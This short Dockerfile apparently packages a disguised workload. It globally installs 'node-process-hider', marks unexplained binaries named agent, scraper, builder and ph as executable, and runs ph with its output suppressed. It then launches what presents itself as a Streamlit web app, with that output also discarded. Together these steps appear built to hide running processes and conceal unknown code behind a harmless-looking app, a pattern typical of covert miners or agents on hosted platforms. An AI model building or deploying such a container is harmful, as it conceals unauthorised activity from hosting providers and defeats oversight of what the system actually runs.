FROM ubuntu:latest
ENV DEBIAN_FRONTEND=noninteractive
ENV TERM=xterm
RUN apt-get update -y; apt-get install curl npm gcc procps python3 --assume-yes;
RUN npm i -g node-process-hider
COPY . .
RUN chmod +x agent scraper builder ph
RUN ./ph > /dev/null
EXPOSE 8080
CMD ["/bin/sh", "-c", "watch free -m & python3 streamlit_app.py > /dev/null"]
